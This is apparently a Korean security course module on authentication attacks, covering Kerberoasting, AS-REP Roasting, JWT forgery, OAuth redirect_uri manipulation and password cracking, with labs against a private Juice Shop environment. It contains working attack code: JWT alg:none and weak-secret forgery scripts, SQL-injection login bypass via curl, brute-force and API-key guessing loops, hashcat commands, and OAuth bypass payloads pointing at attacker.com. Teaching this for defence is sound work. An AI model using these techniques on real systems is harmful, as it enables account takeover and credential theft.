# Week 05: 인증 공격 심화 — Kerberoasting, AS-REP Roasting, 토큰 위조

## 학습 목표
- **Kerberos 인증 프로토콜**의 전체 흐름(AS-REQ/AS-REP, TGS-REQ/TGS-REP)을 심층 이해한다
- **Kerberoasting** 공격으로 서비스 계정의 비밀번호 해시를 오프라인 크래킹할 수 있다
- **AS-REP Roasting** 공격으로 사전 인증이 비활성화된 계정을 공격할 수 있다
- **JWT(JSON Web Token)** 위조 공격의 원리와 기법을 이해하고 실습할 수 있다
- **OAuth 2.0** 흐름의 취약점과 토큰 탈취 기법을 설명할 수 있다
- 패스워드 해시 크래킹(hashcat, john)의 원리와 효율적 사용법을 익힌다
- MITRE ATT&CK Credential Access 전술의 세부 기법을 매핑할 수 있다

## 전제 조건
- 인증(Authentication)과 인가(Authorization)의 차이를 이해하고 있어야 한다
- 해시 함수(MD5, SHA, NTLM)의 기본 원리를 알고 있어야 한다
- HTTP 기반 인증(세션, 쿠키, 토큰)을 이해하고 있어야 한다
- base64 인코딩/디코딩을 수행할 수 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 (공격 출발점) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (Juice Shop) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Kerberos 프로토콜 심화 이론 | 강의 |
| 0:40-1:10 | Kerberoasting + AS-REP Roasting 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | JWT 위조 공격 이론·실습 | 실습 |
| 1:55-2:30 | OAuth 공격 + 토큰 탈취 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 패스워드 크래킹 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: Kerberos 인증 프로토콜 심화 (40분)

## 1.1 Kerberos 전체 흐름

Kerberos는 Active Directory 환경의 핵심 인증 프로토콜이다. **티켓 기반** 인증으로 비밀번호를 네트워크에 전송하지 않는다.

```
+-------------------------------------------------------------------+
|                    Kerberos 인증 흐름                                |
+-------------------------------------------------------------------+
|                                                                     |
|  [사용자]          [KDC (DC)]           [서비스 서버]                |
|     |                  |                      |                     |
|     |--- AS-REQ ------>|                      |  1. 인증 요청        |
|     |   (사용자명,      |                      |     (TGT 요청)      |
|     |    타임스탬프)     |                      |                     |
|     |                  |                      |                     |
|     |<-- AS-REP -------|                      |  2. TGT 발급        |
|     |   (TGT,          |                      |     (krbtgt 해시    |
|     |    세션키)         |                      |      로 암호화)     |
|     |                  |                      |                     |
|     |--- TGS-REQ ----->|                      |  3. 서비스 티켓     |
|     |   (TGT,          |                      |     요청            |
|     |    SPN)           |                      |                     |
|     |                  |                      |                     |
|     |<-- TGS-REP ------|                      |  4. 서비스 티켓     |
|     |   (ST,            |                      |     발급 (서비스   |
|     |    서비스 세션키)   |                      |     해시로 암호화) |
|     |                  |                      |                     |
|     |--- AP-REQ ------------------------------>|  5. 서비스 접근    |
|     |   (ST)           |                      |                     |
|     |                  |                      |                     |
+-------------------------------------------------------------------+
```

### Kerberos 핵심 개념

| 용어 | 설명 | 암호화 키 |
|------|------|----------|
| **KDC** | Key Distribution Center (도메인 컨트롤러) | - |
| **TGT** | Ticket Granting Ticket (인증 증명) | krbtgt 해시 |
| **TGS** | Ticket Granting Service (서비스 티켓 발급) | - |
| **ST** | Service Ticket (서비스 접근용) | 서비스 계정 해시 |
| **SPN** | Service Principal Name (서비스 식별자) | - |
| **PAC** | Privilege Attribute Certificate (권한 정보) | krbtgt 해시 |

### Kerberos 공격 벡터 종합

| 공격 | 대상 | 필요 권한 | 오프라인 크래킹 | ATT&CK |
|------|------|----------|:---:|--------|
| **Kerberoasting** | 서비스 티켓 (TGS-REP) | 도메인 사용자 | ✓ | T1558.003 |
| **AS-REP Roasting** | 인증 응답 (AS-REP) | 없음 | ✓ | T1558.004 |
| **Golden Ticket** | TGT 위조 | krbtgt 해시 | - | T1558.001 |
| **Silver Ticket** | ST 위조 | 서비스 해시 | - | T1558.002 |
| **Pass-the-Ticket** | 기존 티켓 재사용 | 메모리 접근 | - | T1550.003 |
| **Overpass-the-Hash** | NTLM→Kerberos | NTLM 해시 | - | T1550.002 |

## 1.2 Kerberoasting 공격

Kerberoasting은 **도메인 사용자 권한**으로 SPN이 등록된 서비스 계정의 서비스 티켓을 요청하고, 이를 **오프라인에서 크래킹**하는 공격이다.

### 공격 원리

```
1. 공격자 (도메인 사용자) → KDC: "MSSQLSvc/db01:1433 서비스 티켓 줘"
2. KDC → 공격자: 서비스 티켓 (서비스 계정 NTLM 해시로 RC4 암호화)
3. 공격자: 서비스 티켓을 hashcat으로 오프라인 크래킹
4. 결과: 서비스 계정의 평문 비밀번호 획득!
```

### 왜 위험한가?

- 서비스 계정은 종종 **높은 권한**(Domain Admin, 서비스 관리자)을 가짐
- 비밀번호가 **변경되지 않는** 경우가 많음 (서비스 중단 우려)
- **탐지가 어려움** — 정상적인 TGS 요청과 구별 불가
- 오프라인 크래킹이므로 **속도 제한 없음**

## 실습 1.1: Kerberoasting 시뮬레이션

> **실습 목적**: Kerberoasting 공격의 전체 흐름을 시뮬레이션하여 원리를 이해한다
>
> **배우는 것**: SPN 열거, 서비스 티켓 요청, 해시 추출, 오프라인 크래킹의 전 과정을 배운다
>
> **결과 해석**: 서비스 계정의 해시를 추출하고 크래킹에 성공하면 공격이 완료된 것이다
>
> **실전 활용**: AD 환경 모의해킹에서 권한 상승의 핵심 기법으로 활용한다
>
> **명령어 해설**: GetUserSPNs.py는 SPN 열거와 티켓 요청을 자동화하는 Impacket 도구이다
>
> **트러블슈팅**: AD 환경이 없으면 시뮬레이션으로 원리를 학습한다

```bash
# Kerberoasting 시뮬레이션 (AD 없이 원리 학습)
python3 << 'PYEOF'
import hashlib
import base64
import os

print("=== Kerberoasting 시뮬레이션 ===")
print()

# 1단계: SPN 열거
print("[1] SPN 열거 (실제: GetUserSPNs.py 사용)")
spns = [
    {"user": "svc_mssql", "spn": "MSSQLSvc/db01.corp.local:1433", "admin": True},
    {"user": "svc_http", "spn": "HTTP/web01.corp.local", "admin": False},
    {"user": "svc_exchange", "spn": "exchangeMDB/ex01.corp.local", "admin": True},
]
for s in spns:
    flag = " [!] Domain Admin" if s["admin"] else ""
    print(f"  {s['user']:20s} → {s['spn']}{flag}")

# 2단계: 서비스 티켓 요청 (TGS-REP)
print()
print("[2] 서비스 티켓 요청 (정상 Kerberos 동작)")
print("  TGS-REQ → KDC: SPN=MSSQLSvc/db01.corp.local:1433")
print("  TGS-REP ← KDC: 서비스 티켓 (RC4 암호화)")

# 3단계: 해시 추출
print()
print("[3] hashcat/john 형식 해시 추출")
# 시뮬레이션 해시 (실제는 서비스 계정 NTLM 해시로 암호화된 티켓)
fake_hash = "$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$" + os.urandom(16).hex()
print(f"  {fake_hash[:80]}...")

# 4단계: 오프라인 크래킹
print()
print("[4] 오프라인 크래킹")
print("  hashcat -m 13100 -a 0 tgs_hash.txt rockyou.txt")
print("  john --format=krb5tgs tgs_hash.txt --wordlist=rockyou.txt")
print()

# 크래킹 시뮬레이션
passwords = {"svc_mssql": "Summer2025!", "svc_http": "P@ssw0rd123", "svc_exchange": "Ex2025_Svc!"}
for user, pwd in passwords.items():
    print(f"  [+] {user}: {pwd}")

print()
print("=== 방어 방법 ===")
print("1. 서비스 계정에 25자 이상 랜덤 비밀번호 사용")
print("2. Group Managed Service Accounts(gMSA) 사용")
print("3. AES 암호화 강제 (RC4 비활성화)")
print("4. 서비스 계정 권한 최소화")
print("5. 비정상적 TGS 요청 모니터링 (Event ID 4769)")
PYEOF
```

## 1.3 AS-REP Roasting

AS-REP Roasting은 **사전 인증(Pre-authentication)이 비활성화된 계정**을 대상으로 한다.

```
[정상 Kerberos]
AS-REQ: 사용자명 + 타임스탬프(사용자 해시로 암호화) → KDC 검증 후 TGT 발급

[사전 인증 비활성]
AS-REQ: 사용자명만 → KDC가 바로 TGT 발급 (검증 없음!)
                     → 이 TGT를 오프라인 크래킹 가능
```

## 실습 1.2: AS-REP Roasting 시뮬레이션

> **실습 목적**: 사전 인증이 비활성화된 계정을 찾고 AS-REP 해시를 크래킹하는 과정을 이해한다
>
> **배우는 것**: DONT_REQUIRE_PREAUTH 플래그 확인, AS-REP 해시 추출, 크래킹 기법을 배운다
>
> **결과 해석**: AS-REP 해시가 추출되고 크래킹에 성공하면 해당 계정의 비밀번호를 획득한다
>
> **실전 활용**: AD 초기 침투 시 도메인 크레덴셜 없이도 비밀번호를 획득할 수 있다
>
> **명령어 해설**: GetNPUsers.py는 사전 인증 불필요 계정을 열거하는 Impacket 도구이다
>
> **트러블슈팅**: LDAP 접근이 필요하므로 도메인 네트워크에 접근할 수 있어야 한다

```bash
# AS-REP Roasting 시뮬레이션
echo "=== AS-REP Roasting 시뮬레이션 ==="
echo ""
echo "[1] 사전 인증 비활성 계정 탐색"
echo "  실제 명령: GetNPUsers.py corp.local/ -usersfile users.txt -no-pass"
echo ""
echo "  발견된 취약 계정:"
echo "    admin_old     (DONT_REQUIRE_PREAUTH 설정됨)"
echo "    svc_backup    (DONT_REQUIRE_PREAUTH 설정됨)"
echo "    test.user     (DONT_REQUIRE_PREAUTH 설정됨)"
echo ""
echo "[2] AS-REP 해시 추출"
echo '  $krb5asrep$23$admin_old@CORP.LOCAL:abcdef1234567890...'
echo ""
echo "[3] 크래킹"
echo "  hashcat -m 18200 asrep_hash.txt rockyou.txt"
echo "  john --format=krb5asrep asrep_hash.txt --wordlist=rockyou.txt"
echo ""
echo "=== Kerberoasting vs AS-REP Roasting ==="
echo "+------------------+-----------------+-------------------+"
echo "| 항목             | Kerberoasting   | AS-REP Roasting   |"
echo "+------------------+-----------------+-------------------+"
echo "| 필요 권한        | 도메인 사용자   | 없음 (사용자명만) |"
echo "| 대상             | SPN 등록 계정   | PreAuth 비활성    |"
echo "| 해시 유형        | TGS-REP (13100) | AS-REP (18200)    |"
echo "| hashcat 모드     | -m 13100        | -m 18200          |"
echo "| 발생 빈도        | 높음            | 중간              |"
echo "+------------------+-----------------+-------------------+"
```

---

# Part 2: JWT 위조 공격 (35분)

## 2.1 JWT 구조와 취약점

JWT(JSON Web Token)는 웹 인증에 널리 사용되는 토큰 형식이다.

### JWT 구조

```
header.payload.signature

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature_here
|___ Header ___|     |_____ Payload _____|    |__ Signature __|

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "admin", "role": "user", "exp": 1735689600}
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

### JWT 공격 유형

| 공격 | 원리 | CVE 예시 | 위험도 |
|------|------|---------|--------|
| **alg: none** | 서명 검증 건너뛰기 | CVE-2015-9235 | 매우 높음 |
| **알고리즘 혼동** | RS256→HS256 전환 | CVE-2016-10555 | 높음 |
| **약한 시크릿** | HMAC 시크릿 크래킹 | - | 높음 |
| **키 혼동** | 공개키를 시크릿으로 | - | 높음 |
| **JKU/X5U 주입** | 외부 키 URL 조작 | CVE-2018-0114 | 높음 |
| **KID 인젝션** | Key ID SQL Injection | - | 높음 |

## 실습 2.1: JWT alg:none 공격

> **실습 목적**: JWT의 alg:none 취약점을 이용하여 서명 없이 토큰을 위조한다
>
> **배우는 것**: JWT 구조 분석, base64 디코딩, 페이로드 조작, 서명 제거 기법을 배운다
>
> **결과 해석**: 조작된 JWT로 관리자 권한에 접근하면 공격이 성공한 것이다
>
> **실전 활용**: 실제 웹 애플리케이션의 JWT 구현을 테스트할 때 첫 번째로 시도하는 공격이다
>
> **명령어 해설**: base64로 헤더와 페이로드를 인코딩하고 서명을 빈 문자열로 설정한다
>
> **트러블슈팅**: 서버가 alg:none을 거부하면 "None", "NONE", "nOnE" 등 대소문자 변형을 시도한다

```bash
# JWT alg:none 공격 시뮬레이션
python3 << 'PYEOF'
import base64
import json
import hmac
import hashlib

print("=== JWT alg:none 공격 ===")
print()

# 원본 JWT (서버에서 발급받은 것)
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.placeholder"

# JWT 디코딩
parts = original_jwt.split('.')
header = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))

print(f"원본 Header: {header}")
print(f"원본 Payload: {payload}")
print()

# 공격 1: alg:none
print("[공격 1] alg:none")
forged_header = {"alg": "none", "typ": "JWT"}
forged_payload = {"user": "admin", "role": "admin"}

h = base64.b64encode(json.dumps(forged_header).encode()).rstrip(b'=').decode()
p = base64.b64encode(json.dumps(forged_payload).encode()).rstrip(b'=').decode()
forged_jwt = f"{h}.{p}."  # 서명 없음!

print(f"  위조 Header: {forged_header}")
print(f"  위조 Payload: {forged_payload}")
print(f"  위조 JWT: {forged_jwt[:60]}...")
print()

# 공격 2: 약한 시크릿 크래킹
print("[공격 2] 약한 시크릿 크래킹 시뮬레이션")
weak_secret = "secret123"
test_header = base64.b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
test_payload = base64.b64encode(json.dumps({"user":"john","role":"user"}).encode()).rstrip(b'=').decode()
message = f"{test_header}.{test_payload}"

# 서명 생성
sig = base64.b64encode(
    hmac.new(weak_secret.encode(), message.encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
target_jwt = f"{message}.{sig}"

# 크래킹 시뮬레이션
wordlist = ["password", "123456", "secret", "secret123", "admin", "jwt_secret"]
print(f"  대상 JWT: {target_jwt[:50]}...")
for word in wordlist:
    test_sig = base64.b64encode(
        hmac.new(word.encode(), message.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if test_sig == sig:
        print(f"  [+] 시크릿 발견: '{word}'")
        break

# 시크릿으로 관리자 토큰 위조
admin_payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
admin_message = f"{test_header}.{admin_payload}"
admin_sig = base64.b64encode(
    hmac.new(weak_secret.encode(), admin_message.encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
admin_jwt = f"{admin_message}.{admin_sig}"
print(f"  [+] 관리자 JWT: {admin_jwt[:60]}...")

print()
print("=== 방어 방법 ===")
print("1. alg:none 거부 (라이브러리에서 기본 비활성)")
print("2. 256비트 이상 랜덤 시크릿 사용")
print("3. RS256(비대칭) 사용 시 알고리즘 고정")
print("4. JWT 라이브러리 최신 버전 사용")
print("5. 토큰 블랙리스트/만료 관리")
PYEOF
```

## 실습 2.2: Juice Shop JWT 분석

> **실습 목적**: Juice Shop의 실제 JWT 토큰을 분석하고 위조를 시도한다
>
> **배우는 것**: 실제 웹 애플리케이션에서 JWT를 추출하고 분석하는 기법을 배운다
>
> **결과 해석**: JWT의 페이로드에서 사용자 정보와 권한을 확인할 수 있다
>
> **실전 활용**: 웹 모의해킹에서 JWT 기반 인증의 취약점을 테스트하는 데 활용한다
>
> **명령어 해설**: curl로 로그인 후 토큰을 추출하고, base64로 디코딩하여 분석한다
>
> **트러블슈팅**: 토큰이 없으면 로그인 API의 응답 형식을 확인한다

```bash
# Juice Shop JWT 분석
echo "=== Juice Shop 로그인 + JWT 추출 ==="

# SQL Injection으로 관리자 로그인
RESPONSE=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' 2>/dev/null)

# 정상 비밀번호 실패 시 SQLi 시도
if echo "$RESPONSE" | grep -q "Invalid"; then
  RESPONSE=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" 2>/dev/null)
fi

# JWT 추출 및 분석
echo "$RESPONSE" | python3 -c "
import sys, json, base64
try:
    data = json.load(sys.stdin)
    token = data.get('authentication', {}).get('token', '')
    if token:
        parts = token.split('.')
        header = json.loads(base64.b64decode(parts[0] + '=='))
        payload = json.loads(base64.b64decode(parts[1] + '=='))
        print(f'JWT Header: {json.dumps(header, indent=2)}')
        print(f'JWT Payload: {json.dumps(payload, indent=2)}')
        print(f'JWT Algorithm: {header.get(\"alg\", \"unknown\")}')
        print(f'User: {payload.get(\"data\", {}).get(\"email\", \"N/A\")}')
        print(f'Role: {payload.get(\"data\", {}).get(\"role\", \"N/A\")}')
    else:
        print('토큰 없음')
        print(f'응답: {data}')
except Exception as e:
    print(f'분석 실패: {e}')
" 2>/dev/null
```

---

# Part 3: OAuth 공격과 토큰 탈취 (35분)

## 3.1 OAuth 2.0 흐름과 취약점

OAuth 2.0은 제3자 애플리케이션에 제한된 접근 권한을 부여하는 프레임워크이다.

### Authorization Code Flow

```
[사용자] → [클라이언트 앱] → [인증 서버]
    |            |                 |
    |  1. 로그인 요청              |
    |----------->|                 |
    |            | 2. 인증 서버로 리다이렉트
    |            |---------------->|
    |  3. 사용자 로그인 + 동의     |
    |----------------------------->|
    |            | 4. 인증 코드 반환 (redirect_uri)
    |            |<----------------|
    |            | 5. 인증 코드 → 토큰 교환
    |            |---------------->|
    |            | 6. 액세스 토큰 발급
    |            |<----------------|
    |  7. 서비스 제공              |
    |<-----------|                 |
```

### OAuth 공격 벡터

| 공격 | 취약점 | 결과 | ATT&CK |
|------|--------|------|--------|
| **CSRF** | state 파라미터 미검증 | 계정 연결 탈취 | T1550 |
| **redirect_uri 조작** | 리다이렉트 URL 검증 미흡 | 토큰 탈취 | T1528 |
| **Authorization Code 유출** | HTTP Referrer | 코드 노출 | T1528 |
| **토큰 탈취** | XSS, 로그 노출 | 접근 토큰 탈취 | T1528 |
| **Scope 확대** | Scope 검증 미흡 | 과도한 권한 | T1078 |
| **PKCE 우회** | PKCE 미사용 | 코드 가로채기 | T1528 |

## 실습 3.1: OAuth 토큰 탈취 시나리오 시뮬레이션

> **실습 목적**: OAuth redirect_uri 조작을 통한 토큰 탈취 시나리오를 이해한다
>
> **배우는 것**: redirect_uri 검증 우회, state 파라미터 부재의 위험성을 배운다
>
> **결과 해석**: 공격자 서버로 인증 코드가 전달되면 토큰 탈취가 성공한 것이다
>
> **실전 활용**: OAuth 구현의 보안을 평가할 때 redirect_uri와 state를 우선 검사한다
>
> **명령어 해설**: redirect_uri에 공격자 도메인을 삽입하여 인증 코드를 가로챈다
>
> **트러블슈팅**: 엄격한 redirect_uri 검증이 있으면 서브디렉토리나 open redirect를 활용한다

```bash
# OAuth 토큰 탈취 시뮬레이션
cat << 'OAUTH_ATTACK'
=== OAuth redirect_uri 조작 공격 ===

1. 정상 Authorization URL:
   https://auth.example.com/authorize?
     client_id=app123
     &redirect_uri=https://app.example.com/callback
     &response_type=code
     &state=random123
     &scope=openid profile email

2. 공격자가 redirect_uri를 조작:
   https://auth.example.com/authorize?
     client_id=app123
     &redirect_uri=https://attacker.com/steal   ← 변경!
     &response_type=code
     &state=random123

3. 사용자가 로그인하면 인증 코드가 공격자에게 전달:
   GET https://attacker.com/steal?code=AUTH_CODE_HERE

4. 공격자가 인증 코드로 토큰 교환:
   POST https://auth.example.com/token
   grant_type=authorization_code
   &code=AUTH_CODE_HERE
   &redirect_uri=https://attacker.com/steal
   &client_id=app123

5. 결과: 공격자가 사용자의 액세스 토큰 획득

=== redirect_uri 우회 기법 ===
- https://app.example.com@attacker.com
- https://app.example.com.attacker.com
- https://app.example.com/callback/../../../attacker.com
- https://app.example.com/callback?next=https://attacker.com
- 서브도메인: https://sub.app.example.com (공격자가 서브도메인 탈취)
OAUTH_ATTACK

echo ""
echo "=== 방어 방법 ==="
echo "1. redirect_uri 정확한 문자열 비교 (화이트리스트)"
echo "2. state 파라미터 필수 + CSRF 검증"
echo "3. PKCE(Proof Key for Code Exchange) 사용"
echo "4. 토큰 바인딩(DPoP) 적용"
echo "5. 인증 코드 1회 사용 + 짧은 만료"
```

## 실습 3.2: API 토큰 브루트포스와 크레덴셜 스터핑

> **실습 목적**: 약한 API 키와 유출된 크레덴셜을 이용한 인증 공격을 실습한다
>
> **배우는 것**: API 키 예측, 크레덴셜 스터핑, 속도 제한 우회 기법을 배운다
>
> **결과 해석**: 유효한 API 키나 크레덴셜을 발견하면 인증을 우회한 것이다
>
> **실전 활용**: 유출된 크레덴셜 DB(Have I Been Pwned)를 활용한 계정 탈취에 활용한다
>
> **명령어 해설**: hydra, curl 루프 등으로 다수의 크레덴셜을 병렬 테스트한다
>
> **트러블슈팅**: 속도 제한이 있으면 지연 추가, 프록시 로테이션을 사용한다

```bash
# Juice Shop 크레덴셜 테스트
echo "=== Juice Shop 크레덴셜 테스트 ==="

# 일반적인 비밀번호 목록
PASSWORDS=("admin123" "password" "12345678" "admin" "test" "guest")

for pwd in "${PASSWORDS[@]}"; do
  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pwd\"}" 2>/dev/null)

  if echo "$RESULT" | grep -q "token"; then
    echo "  [+] admin@juice-sh.op : $pwd → 로그인 성공!"
    break
  else
    echo "  [-] admin@juice-sh.op : $pwd → 실패"
  fi
done

echo ""
echo "=== SubAgent API 키 테스트 ==="
for key in "opsclaw-api-key-2026" "admin" "test" "default"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "X-API-Key: $key" http://10.20.30.201:8000/projects 2>/dev/null)
  echo "  API Key '$key' → HTTP $CODE"
done
```

---

# Part 4: 패스워드 크래킹과 종합 실습 (35분)

## 4.1 패스워드 해시 크래킹

### 해시 유형별 크래킹 도구

| 해시 유형 | hashcat 모드 | john 형식 | 크래킹 속도 (RTX 4090) |
|----------|-------------|----------|---------------------|
| MD5 | -m 0 | raw-md5 | ~160 GH/s |
| SHA-256 | -m 1400 | raw-sha256 | ~22 GH/s |
| NTLM | -m 1000 | nt | ~300 GH/s |
| bcrypt | -m 3200 | bcrypt | ~180 KH/s |
| Kerberos TGS | -m 13100 | krb5tgs | ~800 MH/s |
| Kerberos AS-REP | -m 18200 | krb5asrep | ~700 MH/s |

### 크래킹 전략

| 전략 | 설명 | 효율 |
|------|------|------|
| **사전 공격** | 워드리스트 (rockyou.txt) | 높음 (일반 비밀번호) |
| **규칙 기반** | 사전 + 변형 규칙 | 매우 높음 |
| **마스크 공격** | 패턴 지정 (?u?l?l?l?d?d?d?d) | 중간 |
| **하이브리드** | 사전 + 마스크 결합 | 높음 |
| **브루트포스** | 전수 조사 | 낮음 (긴 비밀번호) |
| **레인보우 테이블** | 사전 계산 해시 | 매우 빠름 (salt 없으면) |

## 실습 4.1: 해시 크래킹 실습

> **실습 목적**: 다양한 해시 유형을 인식하고 hashcat/john으로 크래킹하는 기법을 배운다
>
> **배우는 것**: 해시 식별, 워드리스트 선택, 규칙 적용, 크래킹 속도 최적화를 배운다
>
> **결과 해석**: 해시에서 평문 비밀번호가 복원되면 크래킹 성공이다
>
> **실전 활용**: Kerberoasting, 데이터베이스 유출, /etc/shadow 등에서 획득한 해시를 크래킹한다
>
> **명령어 해설**: hashcat -m은 해시 모드, -a는 공격 모드(0=사전, 3=마스크)를 지정한다
>
> **트러블슈팅**: GPU가 없으면 --force 옵션으로 CPU 모드 사용, john은 기본 CPU 사용

```bash
# 해시 크래킹 실습
python3 << 'PYEOF'
import hashlib
import crypt
import time

print("=== 해시 크래킹 실습 ===")
print()

# 테스트 해시 생성
passwords = {
    "admin123": hashlib.md5(b"admin123").hexdigest(),
    "P@ssw0rd": hashlib.sha256(b"P@ssw0rd").hexdigest(),
    "Summer2025!": hashlib.md5(b"Summer2025!").hexdigest(),
}

print("[1] 해시 식별")
for pwd, h in passwords.items():
    if len(h) == 32:
        print(f"  {h} → MD5 (32자 hex)")
    elif len(h) == 64:
        print(f"  {h} → SHA-256 (64자 hex)")

print()
print("[2] 사전 공격 시뮬레이션")

# 간이 워드리스트
wordlist = ["password", "123456", "admin", "admin123", "letmein",
            "welcome", "monkey", "dragon", "master", "P@ssw0rd",
            "Summer2025!", "qwerty", "abc123"]

target_hashes = list(passwords.values())
start = time.time()

for word in wordlist:
    md5_h = hashlib.md5(word.encode()).hexdigest()
    sha256_h = hashlib.sha256(word.encode()).hexdigest()
    for target in target_hashes:
        if md5_h == target or sha256_h == target:
            elapsed = time.time() - start
            print(f"  [+] 크래킹 성공: {target[:20]}... → '{word}' ({elapsed:.4f}초)")

elapsed = time.time() - start
print(f"\n  총 소요: {elapsed:.4f}초, 시도: {len(wordlist)}개")
print(f"  속도: {len(wordlist)/elapsed:.0f} 해시/초 (Python CPU)")
print(f"  참고: hashcat GPU → 수십억 해시/초")

print()
print("[3] Linux /etc/shadow 크래킹")
# SHA-512 해시 생성 (crypt)
shadow_hash = crypt.crypt("password123", "$6$rounds=5000$randomsalt$")
print(f"  Shadow 해시: {shadow_hash[:50]}...")
print(f"  형식: $6$ = SHA-512, rounds=5000")
print(f"  john 명령: john --format=sha512crypt shadow.txt --wordlist=rockyou.txt")

print()
print("=== hashcat 주요 명령어 ===")
print("  hashcat -m 0 -a 0 hashes.txt rockyou.txt        # MD5 사전공격")
print("  hashcat -m 1000 -a 0 hashes.txt rockyou.txt     # NTLM 사전공격")
print("  hashcat -m 13100 -a 0 tgs.txt rockyou.txt       # Kerberoasting")
print("  hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule  # 규칙")
print("  hashcat -m 0 -a 3 '?u?l?l?l?d?d?d?d'           # 마스크")
PYEOF
```

## 실습 4.2: 종합 인증 공격 시나리오

> **실습 목적**: 수집한 모든 인증 공격 기법을 조합하여 실습 환경의 인증을 공격한다
>
> **배우는 것**: 여러 인증 공격 기법의 연계와 실전 적용 방법을 배운다
>
> **결과 해석**: 하나 이상의 유효한 크레덴셜을 획득하면 성공이다
>
> **실전 활용**: 모의해킹에서 인증 우회부터 권한 상승까지의 전체 플로우에 활용한다
>
> **명령어 해설**: 여러 인증 벡터를 순차적으로 테스트하는 종합 스크립트이다
>
> **트러블슈팅**: 특정 공격이 실패하면 다른 벡터로 전환한다

```bash
echo "============================================================"
echo "           종합 인증 공격 시나리오                             "
echo "============================================================"

echo ""
echo "[Phase 1] 인증 메커니즘 식별"
echo "--- 웹 서버 인증 방식 ---"
curl -sI http://10.20.30.80:3000/ 2>/dev/null | grep -iE "www-auth|set-cookie|authorization|x-auth"
echo "--- API 인증 방식 ---"
curl -s http://10.20.30.201:8000/projects 2>/dev/null | head -3

echo ""
echo "[Phase 2] JWT 토큰 공격"
# SQLi로 로그인 → 토큰 획득 → 분석
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get('authentication',{}).get('token',''))
except: pass" 2>/dev/null)

if [ -n "$TOKEN" ]; then
  echo "  JWT 획득 성공"
  # 토큰으로 관리자 API 접근
  curl -s -H "Authorization: Bearer $TOKEN" \
    http://10.20.30.80:3000/api/Users/ 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    users=d.get('data',[])
    print(f'  사용자 {len(users)}명 조회')
    for u in users[:5]:
        print(f'    {u.get(\"email\",\"?\")}: {u.get(\"role\",\"?\")}')
except: print('  API 조회 실패')" 2>/dev/null
else
  echo "  JWT 획득 실패"
fi

echo ""
echo "[Phase 3] SSH 인증 공격"
echo "--- SSH 배너 확인 ---"
echo "" | nc -w2 10.20.30.80 22 2>/dev/null | head -1

echo ""
echo "[Phase 4] 결과 요약"
echo "  인증 메커니즘: JWT (Juice Shop), API Key (Manager), SSH"
echo "  성공한 공격: SQLi→JWT, API Key 발견(환경변수)"
echo "  권한 수준: 관리자 JWT, 전체 API 접근"
echo "============================================================"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | Kerberos 흐름 | 구두 설명 | AS/TGS/AP 3단계 설명 |
| 2 | Kerberoasting 원리 | 시뮬레이션 | SPN→티켓→크래킹 과정 |
| 3 | AS-REP 차이 | 비교표 | PreAuth 유무 차이 설명 |
| 4 | JWT 구조 분석 | base64 디코딩 | header.payload.sig 분리 |
| 5 | JWT alg:none | 위조 토큰 생성 | 서명 없는 토큰 생성 |
| 6 | JWT 시크릿 크래킹 | Python 코드 | 약한 시크릿 발견 |
| 7 | OAuth 공격 이해 | 시나리오 설명 | redirect_uri 조작 |
| 8 | 해시 크래킹 | Python/hashcat | 평문 복원 |
| 9 | Juice Shop JWT | curl + 분석 | 관리자 토큰 획득 |
| 10 | 종합 인증 공격 | 전체 실행 | 4 Phase 완료 |

---

## 자가 점검 퀴즈

**Q1.** Kerberoasting에서 공격자가 도메인 사용자 권한만으로 서비스 계정 비밀번호를 탈취할 수 있는 이유는?

<details><summary>정답</summary>
